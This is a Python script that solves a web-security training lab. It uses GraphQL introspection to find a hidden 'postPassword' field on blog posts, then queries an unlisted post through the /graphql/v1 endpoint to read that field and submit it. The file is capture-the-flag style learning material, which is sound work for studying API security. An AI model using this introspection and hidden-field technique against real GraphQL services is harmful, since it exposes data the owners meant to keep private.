from web_security_academy.core.logger import logger

import json


def solve_lab(session):
    # Explanation: By intercepting HTTP traffic, I saw that a GraphQL query is made at
    # the endpoint "/graphql/v1", and noticed that there was no post with id = 3. I ran
    # a full introspection query and found the query "getBlogPost(id:Int!): BlogPost".
    # I also noticed that the BlogPost type has the field "postPassword: String".

    query = {
        "query": "query { getBlogPost(id: 3) { postPassword }}",
    }
    logger.info('Posting the following JSON to "/graphql/v1"...')
    logger.info(query)

    resp = session.post_path("/graphql/v1", json=query)
    resp = json.loads(resp.text)
    logger.info(f"Query result: {resp}")

    session.submit_solution(resp["data"]["getBlogPost"]["postPassword"])
